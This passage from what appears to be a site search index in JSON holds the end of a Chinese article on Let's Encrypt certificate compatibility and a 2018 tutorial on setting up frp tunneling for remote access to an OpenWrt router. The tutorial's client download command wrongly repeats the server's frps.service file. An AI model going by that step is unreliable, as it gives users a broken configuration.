\u8bc1\u4e66\u7684\u517c\u5bb9\u6027\uff0c\u6240\u6709\u64cd\u4f5c\u7cfb\u7edf\u3001\u6d4f\u89c8\u5668\u9ed8\u8ba4\u662f\u5426\u90fd\u80fd\u8bc6\u522b\u662f\u5927\u5bb6\u6700\u5173\u5fc3\u7684\u95ee\u9898\u3002\u5b9e\u9645\u4e0a\uff0c\u7531\u4e8e Let's Encrypt \u4e0e IdenTrust \u7684 DST Root CA \u505a\u4e86\u4ea4\u53c9\u8ba4\u8bc1\uff0c\u517c\u5bb9\u6027\u8fd8\u662f\u4e0d\u9519\u7684\uff0c\u76ee\u524d\u6211\u53ea\u662f\u53d1\u73b0\u5728 Android 2 \u548c Windows XP \u4e0b\u6709\u95ee\u9898\uff08Firefox \u7684\u8bc1\u4e66\u90a3\u4e00\u5957\u662f\u81ea\u5df1\u5b9e\u73b0\u7684\uff0c\u4e0d\u4f9d\u8d56\u4e8e\u7cfb\u7edf\uff0cXP \u4e0b\u53ea\u6709 Firefox \u4fe1\u4efb Let's Encrypt \u8bc1\u4e66\uff09\uff0c\u5176\u5b83\u73af\u5883\u90fd\u6b63\u5e38\u3002 \uff08Windows XP \u4e0d\u4fe1\u4efb Let's Encrypt \u7684\u4e2d\u95f4\u8bc1\u4e66\uff09 \u66f4\u65b0\uff1a\u6839\u636e Let's Encrypt \u5b98\u65b9\u8bf4\u660e\uff0cWindows XP \u4e0b\u7684\u95ee\u9898\u5f88\u5feb\u5c31\u4f1a\u89e3\u51b3\uff1a A bug in Windows XP causes parsing of our current cross-signature from IdenTrust to fail. We will be correcting this by getting new cross-signatures from IdenTrust which work on Windows XP. \u6ce8\uff1a\u5df2\u4e8e 2016 \u5e74 3 \u6708 26 \u65e5\u89e3\u51b3\u3002 \u53e6\u5916\u4e00\u4e2a\u95ee\u9898\u6709\u5173 ECC \u8bc1\u4e66\uff0c\u5b98\u7f51\u8868\u793a\u8ba1\u5212\u5c06\u5728 2016 \u5e74\u63d0\u4f9b\u5bf9 ECC \u8bc1\u4e66\u7684\u652f\u6301\uff1a Right now all of our root and intermediate keys use RSA. We're planning to generate ECC keys and make an ECC option available to subscribers in 2016. via \u6ce8\uff1aLet's Encrypt \u5df2\u4e8e 2016 \u5e74 2 \u6708 11 \u65e5\u5f00\u59cb\u652f\u6301\u7b7e\u53d1 ECC \u8bc1\u4e66\u3002 Let's Encrypt \u5b98\u65b9\u7684\u65b0\u7279\u6027\u9884\u544a\u53ef\u4ee5\u5728 \u8fd9\u4e2a\u9875\u9762\u67e5\u770b \u3002 \u6211\u4e2a\u4eba\u5efa\u8bae\uff1a\u5bf9\u4e8e\u4e2a\u4eba\u7528\u6237\u6765\u8bf4\uff0c\u5982\u679c\u975e\u5e38\u5728\u610f\u8bc1\u4e66\u517c\u5bb9\u6027\uff0c\u53ef\u4ee5\u8d2d\u4e70 RapidSSL Standard \u6216\u8005 Comodo Positive SSL \u8fd9\u4e24\u79cd\u8bc1\u4e66\u3002\u5176\u4e2d RapidSSL \u8bc1\u4e66\u4e00\u5171\u624d\u4e09\u7ea7\uff0c\u6bd4\u8f83\u5c0f\uff1bComodo Positive \u6709\u56db\u7ea7\uff0c\u4f46\u53ef\u4ee5\u7533\u8bf7 ECC \u8bc1\u4e66\uff1b\u4e8c\u8005\u90fd\u6709\u7740\u4e0d\u9519\u7684\u517c\u5bb9\u6027\uff0c\u4e5f\u975e\u5e38\u5ec9\u4ef7\uff08\u4e00\u5e74\u4e0d\u5230 10$\uff09\u3002\u5f53\u7136\uff0c\u5982\u679c\u4e0d\u7528\u8003\u8651 Windows XP \u7528\u6237\uff0c\u90a3\u4e48\u5f3a\u70c8\u63a8\u8350 Let's Encrypt\uff01 \u66f4\u65b0\uff1aLet's Encrypt \u5df2\u7ecf\u652f\u6301 Windows XP \u548c\u7b7e\u53d1 ECC \u8bc1\u4e66\uff0c\u5bf9\u4e8e\u4e2a\u4eba\u7528\u6237\u6765\u8bf4\uff0c\u76ee\u524d Let's Encrypt \u65e0\u7591\u662f\u6700\u597d\u7684\u9009\u62e9\u3002 \u672c\u6587\u5148\u5199\u5230\u8fd9\u91cc\uff0c\u5982\u679c\u4f60\u5728\u7533\u8bf7 Let's Encrypt \u8bc1\u4e66\u7684\u8fc7\u7a0b\u4e2d\u9047\u5230\u95ee\u9898\uff0c\u53ef\u4ee5\u7ed9\u6211\u7559\u8a00\uff0c\u4e5f\u6b22\u8fce\u4ea4\u6d41\u5404\u79cd\u5fc3\u5f97\uff01 \u672c\u6587\u94fe\u63a5\uff1a https://imququ.com/post/letsencrypt-certificate.html \uff0c \u53c2\u4e0e\u8bc4\u8bba \u00bb --EOF-- \u539f\u6587\u94fe\u63a5\uff1a https://imququ.com/post/letsencrypt-certificate.html","title":"\u51e0\u4e2a\u95ee\u9898"},{"location":"RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/","text":"OpenWrt \u4f7f\u7528 frp \u5b9e\u73b0\u5185\u7f51\u7a7f\u900f \u51c6\u5907\u5de5\u4f5c \u642d\u5efa\u5185\u7f51\u7a7f\u900f \u6587\u7ae0\u8bc4\u8bba \u6700\u540e\u66f4\u65b0\u65f6\u95f4\uff1a2018\u5e7411\u670817\u65e5 \u6709\u65f6\u6211\u4eec\u9700\u8981\u4e3a\u4e86\u65b9\u4fbf\uff0c\u8fdc\u7a0b\u8bbf\u95ee\u8def\u7531\u5668\uff0c\u4e0d\u8fc7\u8fdc\u7a0b\u8bbf\u95ee\u53ef\u80fd\u5e76\u6ca1\u6709\u90a3\u4e48\u5bb9\u6613\u3002 \u5982\u679c\u4f60\u6709\u516c\u7f51 IP \u7684\u8bdd\uff0c\u6253\u5f00\u67d0\u4e9b\u7aef\u53e3\u5c31\u53ef\u4ee5\u8bbf\u95ee\uff0c\u4f46 IPv4 \u5730\u5740\u5c31\u90a3\u4e48\u70b9\uff0c\u4e0d\u591f\u7ed9\u6bcf\u4e2a\u4eba\u6216\u6bcf\u53f0\u8bbe\u5907\u5206\u914d\uff0cIPv6 \u8fd8\u6ca1\u5b8c\u5168\u666e\u53ca\u3002\u8fd9\u65f6\u5019\u9700\u8981\u53e6\u4e00\u79cd\u65b9\u6cd5\uff1a\u5185\u7f51\u7a7f\u900f\u3002 \u4ec0\u4e48\u662f\u5185\u7f51\u7a7f\u900f\uff1f\u7b80\u5355\u6765\u8bb2\u5c31\u662f\uff1a\u5185\u7f51\u8bbe\u5907\u548c\u516c\u7f51\u8bbe\u5907\u4e4b\u95f4\u4fdd\u6301\u4e00\u4e2a\u6301\u4e45\u8fde\u63a5\uff0c\u5f53\u7528\u6237\u8bbf\u95ee\u516c\u7f51\u8bbe\u5907\u65f6\uff0c\u516c\u7f51\u8bbe\u5907\u5c06\u8bf7\u6c42\u8f6c\u53d1\u7ed9\u5185\u7f51\u8bbe\u5907\uff0c\u7531\u5185\u7f51\u8bbe\u5907\u5904\u7406\u8bf7\u6c42\u518d\u628a\u6570\u636e\u8fd4\u56de\u7ed9\u516c\u7f51\u8bbe\u5907\u63a5\u7740\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u4ece\u800c\u53ef\u4ee5\u8fdc\u7a0b\u8bbf\u95ee\u5185\u7f51\u8bbe\u5907\u3002 \u5185\u7f51\u7a7f\u900f\u53ef\u4ee5\u4f7f\u7528\u5185\u7f51\u7a7f\u900f\u8f6f\u4ef6\u6765\u5b9e\u73b0\uff0c\u6bd4\u5982\uff1aNgrok \u548c frp\u3002 Ngrok \u642d\u5efa\u6bd4\u8f83\u590d\u6742\uff0c\u9700\u8981\u4ece Google \u4e0b\u8f7d\u6587\u4ef6\uff0c\u5bf9\u56fd\u5185 VPS \u4e0d\u592a\u53cb\u597d\u3002 frp \u5c31\u597d\u591a\u4e86\uff0c\u914d\u7f6e\u7b80\u5355\uff0c\u652f\u6301\u591a\u79cd\u534f\u8bae\uff0c\u8fd9\u6b21\u6211\u4eec\u5c31\u7528 frp \u6765\u642d\u5efa\u4e00\u4e2a\u5185\u7f51\u7a7f\u900f\u3002 \u51c6\u5907\u5de5\u4f5c \u4e00\u53f0\u516c\u7f51\u8bbe\u5907\uff0c\u6bd4\u5982\uff1a\u670d\u52a1\u5668\u3001VPS \u6216\u8005 \u5176\u4ed6\u6709\u516c\u7f51 IP \u7684\u8bbe\u5907\u3002 \u8def\u7531\u5668\u53ef\u7528\u7a7a\u95f4\u9700\u5927\u4e8e 5M \u642d\u5efa\u5185\u7f51\u7a7f\u900f \u8fdb\u5165 https://github.com/fatedier/frp/releases/latest \u4e0b\u8f7d\u516c\u7f51\u8bbe\u5907\u548c\u8def\u7531\u5668\u5bf9\u5e94\u7684\u7248\u672c \u516c\u7f51\u8bbe\u5907\u5982\u679c\u662f\u670d\u52a1\u5668\u6216\u8005 VPS\uff0c\u7cfb\u7edf\u662f Windows \u4e0b\u8f7d Windows \u7248\u672c\uff0cLinux \u4e0b\u8f7d Linux \u7248\u672c\uff0c\u7136\u540e\u6839\u636e\u7cfb\u7edf\u4f4d\u6570\u518d\u9009\u62e9 i386 \u6216 amd64\u3002 \u8def\u7531\u5668\u6839\u636e CPU \u67b6\u6784\u4e0b\u8f7d\u5bf9\u5e94\u7684 Linux \u7248\u672c\uff0c\u8fd9\u4e2a\u6211\u8bf4\u8fc7\u5f88\u591a\u6b21\u4e86\u3002 \u538b\u7f29\u5305\u4f1a\u6709\u4e24\u4e2a\u53ef\u6267\u884c\u6587\u4ef6 frps \u548c frpc\uff0cs \u662f\u670d\u52a1\u7aef\uff0cc \u662f\u5ba2\u6237\u7aef\u3002\u670d\u52a1\u7aef\u4e0a\u4f20\u5230\u516c\u7f51\u8bbe\u5907\uff0c\u5ba2\u6237\u7aef\u4e0a\u4f20\u5230\u8def\u7531\u5668\uff0c\u914d\u7f6e\u6587\u4ef6\u4e5f\u9700\u8981\u4e0a\u4f20\uff0cfrps.ini \u548c frpc.ini\u3002 \u9996\u5148\u521b\u5efa\u4e00\u4e2a\u5b58\u653e frp \u7684\u76ee\u5f55\uff1a mkdir /usr/local/frp \u7136\u540e\u5c06 frp \u7684\u53ef\u6267\u884c\u6587\u4ef6\u4e0a\u4f20\u5230 /usr/local/frp \uff0c\u5f53\u7136\uff0c\u4f60\u53ef\u4ee5\u4e0a\u4f20\u5230\u522b\u7684\u4f4d\u7f6e\u3002 \u8bbe\u7f6e\u53ef\u6267\u884c\u6587\u4ef6\u6743\u9650\uff1a chmod +x /usr/local/frp/frp* \u521b\u5efa\u53ef\u6267\u884c\u6587\u4ef6\u7684\u8f6f\u8fde\u63a5\uff1a ln -s /usr/local/frp/frps /usr/bin/frps \u6216 ln -s /usr/local/frp/frpc /usr/bin/frpc \u4e0b\u9762\u914d\u7f6e\u4ee5\u5355\u4eba\u4f7f\u7528\u4e3a\u4f8b\uff0c\u5982\u679c\u9700\u8981\u914d\u7f6e\u591a\u4eba\u4f7f\u7528\uff0c\u8bf7\u81ea\u884c\u67e5\u770b \u5b98\u65b9\u6587\u6863 \u8fdb\u884c\u4fee\u6539\u3002 \u914d\u7f6e\u670d\u52a1\u7aef \u6253\u5f00\u914d\u7f6e\u6587\u4ef6\uff1afrps.ini bind_port = 7000 \u662f frps \u7684\u7aef\u53e3\uff0c\u53ef\u4ee5\u6539\uff0c\u4e5f\u53ef\u4ee5\u7528\u9ed8\u8ba4\u7684\u3002 \u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e\u9879\uff1a token \uff0c\u8fd9\u4e2a\u7528\u6765\u505a\u8eab\u4efd\u9a8c\u8bc1\uff0c\u63a8\u8350\u5f00\u542f\u3002\u53ea\u6709 frps \u548c frpc \u4e00\u81f4\u624d\u53ef\u4ee5\u5efa\u7acb\u8fde\u63a5\uff0c\u6ce8\u610f\uff0c\u5b83\u4eec\u4e4b\u95f4\u65f6\u95f4\u5dee\u4e0d\u80fd\u8d85\u8fc7 15 \u5206\u949f\uff0c\u53ef\u4ee5\u901a\u8fc7\u6dfb\u52a0 authentication_timeout \u914d\u7f6e\u9879\u6765\u66f4\u6539\u8fd9\u4e2a\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u79d2\uff0c\u9ed8\u8ba4\u4e3a 900\u3002\u5982\u679c\u4f60\u4f7f\u7528\u7684\u662f\u56fd\u5916 VPS \u7684\u8bdd\uff0c\u9700\u8981\u6ce8\u610f\u8fd9\u4e00\u70b9\u3002 \u5982\u679c\u6709\u9700\u8981\u7684\u8bdd\uff0c\u6dfb\u52a0 log_file \u914d\u7f6e\u9879\u4fdd\u5b58\u65e5\u5fd7\uff0c\u6bd4\u5982\uff1a log_file = /var/log/frps.log \uff0c\u6ce8\u610f\uff0c\u6dfb\u52a0\u6b64\u9879\u540e\uff0c\u8fd0\u884c frp \u4e0d\u4f1a\u8f93\u51fa\u4efb\u4f55\u4fe1\u606f\u3002 \u6dfb\u52a0 vhost_http_port \u548c vhost_https_port \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u5ba2\u6237\u7aef\u7684\u8f6c\u53d1\u534f\u8bae\u4e3a HTTP \u6216 HTTPS \u65f6\u7684\u8bbf\u95ee\u7aef\u53e3\u3002 \u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\uff1a https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.ini \u914d\u7f6e\u5ba2\u6237\u7aef \u6253\u5f00\u914d\u7f6e\u6587\u4ef6\uff1afrpc.ini server_addr \u548c server_port \u662f frps \u7684 IP \u548c\u7aef\u53e3\u3002 \u4e0b\u9762\u9ed8\u8ba4\u6709\u4e00\u4e2a SSH \u914d\u7f6e\uff0c\u628a\u5b83\u5220\u4e86\u3002 \u5982\u679c\u4f60\u5728 frps \u8bbe\u7f6e\u4e86 token \uff0c\u90a3 frpc \u4e5f\u9700\u8981\u540c\u6837\u7684\u914d\u7f6e\u9879\u3002 \u5982\u679c\u6709\u9700\u8981\u7684\u8bdd\uff0c\u6dfb\u52a0 log_file \u914d\u7f6e\u9879\u4fdd\u5b58\u65e5\u5fd7\uff0c\u6bd4\u5982\uff1a log_file = /var/log/frpc.log \uff0c\u6ce8\u610f\uff0c\u6dfb\u52a0\u6b64\u9879\u540e\uff0c\u8fd0\u884c frp \u5c06\u4e0d\u4f1a\u6709\u4efb\u4f55\u8f93\u51fa\u4fe1\u606f\u3002 \u53ef\u4ee5\u6dfb\u52a0 login_fail_exit \u914d\u7f6e\u9879\u51b3\u5b9a\u662f\u5426\u8ba9 fprc \u8fde\u63a5 frps \u5931\u8d25\u540e\u9000\u51fa\u7a0b\u5e8f\uff0c\u63a8\u8350\u8bbe\u7f6e\u4e3a false \uff0c\u9632\u6b62\u5f02\u5e38\u9000\u51fa\u3002 \u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e\u8282\u70b9\uff1a [web] \u6dfb\u52a0 type \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u8f6c\u53d1\u534f\u8bae\uff0c\u652f\u6301\uff1ahttp\u3001https\u3001tcp\u3001udp \u7b49\uff0c\u8f6c\u53d1 Web \u4f7f\u7528 HTTP(S)\uff0c\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 TCP\u3002 \u6dfb\u52a0 local_ip \u548c local_port \u8bbe\u7f6e\u672c\u5730 IP \u548c\u7aef\u53e3\uff0cIP \u8bbe\u7f6e\u4e3a 127.0.0.1\uff0c\u7aef\u53e3\u8bbe\u7f6e\u4e3a\u4f60\u8981\u8f6c\u53d1\u7684\u7aef\u53e3\u5373\u53ef\uff0cWeb \u4e00\u822c\u4e3a 80 \u548c 443 (HTTPS) \u53ef\u4ee5\u6dfb\u52a0 custom_domains \u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\uff0c\u5982\u679c\u914d\u7f6e\u4e86\u591a\u4e2a Web \u670d\u52a1\uff0c\u53ef\u4ee5\u7528\u4e0d\u540c\u7684\u57df\u540d\u6765\u8bbf\u95ee\u3002 \u53ef\u4ee5\u6dfb\u52a0 use_encryption = true \u548c use_compression = true \u52a0\u5bc6\u548c\u538b\u7f29\u6570\u636e\uff0c\u4f46\u4f1a\u6d88\u8017\u989d\u5916\u7684 CPU \u8d44\u6e90\u3002 \u53ef\u4ee5\u6dfb\u52a0 http_user \u548c http_pwd \u6765\u4fdd\u62a4 Web \u670d\u52a1\uff0c\u4ec5\u652f\u6301 HTTP\u3002 \u5982\u679c\u4f60\u9700\u8981\u8f6c\u53d1 TCP \u548c UDP\uff0c\u53ea\u9700\u8981\u5728\u914d\u7f6e\u8282\u70b9\u91cc\u6dfb\u52a0 remote_port \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u8fdc\u7a0b\u7aef\u53e3\u5373\u53ef\u3002\u6bd4\u5982\u8f6c\u53d1 SSH\uff0c remote_port \u8bbe\u7f6e\u4e3a 222\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u8bbf\u95ee ssh://\u8fdc\u7a0bIP:222 \u5c31\u53ef\u4ee5\u4e86\u3002 \u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\uff1a https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frpc.ini \u4f60\u53ef\u4ee5\u76f4\u63a5\u5728\u6211\u7684\u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\u57fa\u7840\u4e0a\u8fdb\u884c\u4fee\u6539\u3002 \u66f4\u591a\u914d\u7f6e\u53c2\u6570\u53ef\u4ee5\u53c2\u8003 \u5b98\u65b9\u6587\u6863 \u914d\u7f6e\u6587\u4ef6\u4fee\u6539\u5b8c\u6210\u540e\uff0c\u540c\u6837\u4e0a\u4f20\u5230\u4f60\u7684\u516c\u7f51\u8bbe\u5907\u548c\u8def\u7531\u5668\u7684 frp \u76ee\u5f55\u3002 \u4e00\u5207\u914d\u7f6e\u5b8c\u6210\u540e\uff0c\u5148\u5728\u524d\u7aef\u8fd0\u884c\u6d4b\u8bd5\u4e00\u4e0b\u3002 \u670d\u52a1\u7aef\uff1a frps -c /usr/local/frp/frps.ini \u5ba2\u6237\u7aef\uff1a frpc -c /usr/local/frp/frpc.ini \u5982\u679c\u63d0\u793a\u547d\u4ee4\u4e0d\u5b58\u5728\uff0c\u8bf7\u68c0\u67e5\u4f60\u7684\u8f6f\u8fde\u63a5\u662f\u5426\u521b\u5efa\u6709\u8bef\u3002 \u52a1\u5fc5\u5148\u8fd0\u884c\u670d\u52a1\u7aef\u518d\u8fd0\u884c\u5ba2\u6237\u7aef\uff0c\u5426\u5219\u5ba2\u6237\u7aef\u4f1a\u81ea\u52a8\u9000\u51fa\u3002 \u8fd0\u884c\u6210\u529f\u540e\u8bbf\u95ee\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u6ca1\u95ee\u9898\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u653e\u5728\u540e\u53f0\u8fd0\u884c\u4e86\u3002 \u540e\u53f0\u8fd0\u884c \u7b2c\u4e00\u79cd\uff1a \u8fd0\u884c\uff1a frpc -c /usr/local/frp/frpc.ini >/dev/null 2>&1 & \u7ed3\u675f\uff1a killall frpc \u5f00\u673a\u8fd0\u884c\uff1a sed -i '/exit 0/i\\sleep 10 && frpc -c /usr/local/frp/frpc.ini >/dev/null 2>&1 &' /etc/rc.local \u53d6\u6d88\u5f00\u673a\u8fd0\u884c\uff1a sed -i '/sleep 10 && frpc -c \\/usr\\/local\\/frp\\/frpc.ini >\\/dev\\/null 2>&1 &/d' /etc/rc.local \u4e0d\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u540e\u53f0\u8fd0\u884c frp\uff0c\u597d\u50cf\u7279\u522b\u5bb9\u6613\u6302\u6389\u3002 \u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\u63a8\u8350\u5f00\u542f\u65e5\u5fd7\u4fdd\u5b58 \u7b2c\u4e8c\u79cd\uff1a\u4f7f\u7528 screen \u8def\u7531\u5668\u5b89\u88c5\u547d\u4ee4\uff1a opkg update && opkg install screen \uff0c\u670d\u52a1\u5668\u5b89\u88c5\u547d\u4ee4\uff1a sudo apt-get install screen -y \u6216 sudo yum install screen -y \u3002 screen \u7684\u8be6\u7ec6\u7528\u6cd5\u5927\u5bb6\u53ef\u4ee5\u53bb\u767e\u5ea6\u4e00\u4e0b\uff0c\u6211\u8fd9\u91cc\u53ea\u8bf4\u600e\u4e48\u7528\u5b83\u6765\u540e\u53f0\u8fd0\u884c frp\u3002 \u8fd0\u884c\uff1a screen -dmS frpc frpc -c /usr/local/frp/frpc.ini \u67e5\u770b\u8fd0\u884c\u72b6\u6001\uff1a screen -r frpc \u67e5\u770b\u8fd0\u884c\u72b6\u6001\u540e\uff0c\u6309 Ctrl + C \u7ed3\u675f frpc\uff0c\u6309 Ctrl + A + D (A \u548c D \u4f9d\u6b21\u6309\u4e0b) \u4e3a\u6682\u65f6\u9000\u51fa\uff0c\u4f9d\u7136\u4fdd\u6301\u540e\u53f0\u8fd0\u884c\u3002 \u5f00\u673a\u8fd0\u884c\uff1a sed -i '/exit 0/i\\sleep 10 && screen -dmS frpc frpc -c /usr/local/frp/frpc.ini' /etc/rc.local \u53d6\u6d88\u5f00\u673a\u8fd0\u884c\uff1a sed -i '/sleep 10 && screen -dmS frpc frpc -c \\/usr\\/local\\/frp\\/frpc.ini/d' /etc/rc.local \u5f00\u673a\u5ef6\u8fdf 10 \u79d2\u8fd0\u884c\u662f\u786e\u4fdd\u8def\u7531\u5668\u8054\u7f51\uff0c\u907f\u514d frpc \u81ea\u52a8\u9000\u51fa\u3002 \u7b2c\u4e09\u79cd\uff08\u4ec5\u9002\u7528\u4e8e\u6709 systemd \u7684 Linux \u53d1\u884c\u7248\uff09\uff1a \u4e0b\u8f7d\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u5bf9\u5e94\u7684 systemd \u670d\u52a1\u6587\u4ef6\uff0c\u91cc\u9762\u7684\u8def\u5f84\u662f\u9ed8\u8ba4\u7684 /usr/local/frp/ \uff0c\u5982\u679c\u4f60\u7684\u8def\u5f84\u4e0d\u662f\u8fd9\u4e2a\uff0c\u6ce8\u610f\u66f4\u6539\u3002 \u670d\u52a1\u7aef\uff1a sudo wget https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.service -O /lib/systemd/system/frps.service \u5ba2\u6237\u7aef\uff1a sudo wget https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.service -O /lib/systemd/system/frps.service \u5f00\u673a\u542f\u52a8 frp\uff1a systemctl enable frpc.service \u6216 systemctl enable frps.service \u542f\u52a8 frp\uff1a systemctl start frpc.service \u6216 systemctl start frps.service \u505c\u6b62 frp\uff1a systemctl stop frpc.service \u6216 systemctl stop frps.service \u91cd\u542f frp\uff1a systemctl restart frpc.service \u6216 systemctl restart frps.service \u67e5\u770b systemd \u670d\u52a1\u72b6\u6001\uff1a systemctl status frpc.service \u6216 systemctl status frps.service \u5982\u679c\u63d0\u793a running \u5219\u8868\u793a\u8fd0\u884c\u6b63\u5e38 \u5982\u679c\u4f60\u60f3\u8fdc\u7a0b\u7535\u8111\uff0c\u53ef\u4ee5\u5728\u7535\u8111\u4e0a\u5b89\u88c5 TeamViewer \uff0c\u7136\u540e\u5f00\u542f\u4e3b\u677f BIOS \u91cc\u7684 PCI \u8bbe\u5907\u5524\u9192\uff0c\u8def\u7531\u5668\u5b89\u88c5 WOL \u7f51\u7edc\u5524\u9192\uff0c\u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u8fdc\u7a0b\u5f00\u673a\uff0c\u5e76\u4e14\u4f7f\u7528 TeamViewer \u63a7\u5236\u7535\u8111\u3002 \u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u8f6c\u53d1\u5185\u7f51\u5185\u5176\u4ed6\u8bbe\u5907\u7684\u670d\u52a1\uff0c\u5c06 frpc \u7684 local_ip \u914d\u7f6e\u9879\u6539\u4e3a\u5185\u7f51\u5176\u4ed6\u8bbe\u5907\u7684 IP \u5373\u53ef\u3002 GitHub: https://github.com/fatedier/frp \u5fae\u4fe1\u626b\u63cf\u4e8c\u7ef4\u7801\u5173\u6ce8\u6211\u4eec \u5982\u679c\u89c9\u5f97\u6587\u7ae0\u6709\u5e2e\u52a9\u5230\u4f60\uff0c\u53ef\u4ee5\u70b9\u51fb\u4e0b\u65b9\u7684\u6253\u8d4f\u6309\u94ae\u8d5e\u52a9\u4e0b\u670d\u52a1\u5668\u8d39\u7528\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.mivm.cn/openwrt-frp/","title":"OpenWrt \u4f7f\u7528 frp \u5b9e\u73b0\u5185\u7f51\u7a7f\u900f \u51c6\u5907\u5de5\u4f5c \u642d\u5efa\u5185\u7f51\u7a7f\u900f \u6587\u7ae0\u8bc4\u8bba"},{"location":"RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/#openwrt-frp","text":"\u6700\u540e\u66f4\u65b0\u65f6\u95f4\uff1a2018\u5e7411\u670817\u65e5 \u6709\u65f6\u6211\u4eec\u9700\u8981\u4e3a\u4e86\u65b9\u4fbf\uff0c\u8fdc\u7a0b\u8bbf\u95ee\u8def\u7531\u5668\uff0c\u4e0d\u8fc7\u8fdc\u7a0b\u8bbf\u95ee\u53ef\u80fd\u5e76\u6ca1\u6709\u90a3\u4e48\u5bb9\u6613\u3002 \u5982\u679c\u4f60\u6709\u516c\u7f51 IP \u7684\u8bdd\uff0c\u6253\u5f00\u67d0\u4e9b\u7aef\u53e3\u5c31\u53ef\u4ee5\u8bbf\u95ee\uff0c\u4f46 IPv4 \u5730\u5740\u5c31\u90a3\u4e48\u70b9\uff0c\u4e0d\u591f\u7ed9\u6bcf\u4e2a\u4eba\u6216\u6bcf\u53f0\u8bbe\u5907\u5206\u914d\uff0cIPv6 \u8fd8\u6ca1\u5b8c\u5168\u666e\u53ca\u3002\u8fd9\u65f6\u5019\u9700\u8981\u53e6\u4e00\u79cd\u65b9\u6cd5\uff1a\u5185\u7f51\u7a7f\u900f\u3002 \u4ec0\u4e48\u662f\u5185\u7f51\u7a7f\u900f\uff1f\u7b80\u5355\u6765\u8bb2\u5c31\u662f\uff1a\u5185\u7f51\u8bbe\u5907\u548c\u516c\u7f51\u8bbe\u5907\u4e4b\u95f4\u4fdd\u6301\u4e00\u4e2a\u6301\u4e45\u8fde\u63a5\uff0c\u5f53\u7528\u6237\u8bbf\u95ee\u516c\u7f51\u8bbe\u5907\u65f6\uff0c\u516c\u7f51\u8bbe\u5907\u5c06\u8bf7\u6c42\u8f6c\u53d1\u7ed9\u5185\u7f51\u8bbe\u5907\uff0c\u7531\u5185\u7f51\u8bbe\u5907\u5904\u7406\u8bf7\u6c42\u518d\u628a\u6570\u636e\u8fd4\u56de\u7ed9\u516c\u7f51\u8bbe\u5907\u63a5\u7740\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u4ece\u800c\u53ef\u4ee5\u8fdc\u7a0b\u8bbf\u95ee\u5185\u7f51\u8bbe\u5907\u3002 \u5185\u7f51\u7a7f\u900f\u53ef\u4ee5\u4f7f\u7528\u5185\u7f51\u7a7f\u900f\u8f6f\u4ef6\u6765\u5b9e\u73b0\uff0c\u6bd4\u5982\uff1aNgrok \u548c frp\u3002 Ngrok \u642d\u5efa\u6bd4\u8f83\u590d\u6742\uff0c\u9700\u8981\u4ece Google \u4e0b\u8f7d\u6587\u4ef6\uff0c\u5bf9\u56fd\u5185 VPS \u4e0d\u592a\u53cb\u597d\u3002 frp \u5c31\u597d\u591a\u4e86\uff0c\u914d\u7f6e\u7b80\u5355\uff0c\u652f\u6301\u591a\u79cd\u534f\u8bae\uff0c\u8fd9\u6b21\u6211\u4eec\u5c31\u7528 frp \u6765\u642d\u5efa\u4e00\u4e2a\u5185\u7f51\u7a7f\u900f\u3002","title":"OpenWrt \u4f7f\u7528 frp \u5b9e\u73b0\u5185\u7f51\u7a7f\u900f \u51c6\u5907\u5de5\u4f5c \u642d\u5efa\u5185\u7f51\u7a7f\u900f \u6587\u7ae0\u8bc4\u8bba"},{"location":"RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/#_1","text":"\u4e00\u53f0\u516c\u7f51\u8bbe\u5907\uff0c\u6bd4\u5982\uff1a\u670d\u52a1\u5668\u3001VPS \u6216\u8005 \u5176\u4ed6\u6709\u516c\u7f51 IP \u7684\u8bbe\u5907\u3002 \u8def\u7531\u5668\u53ef\u7528\u7a7a\u95f4\u9700\u5927\u4e8e 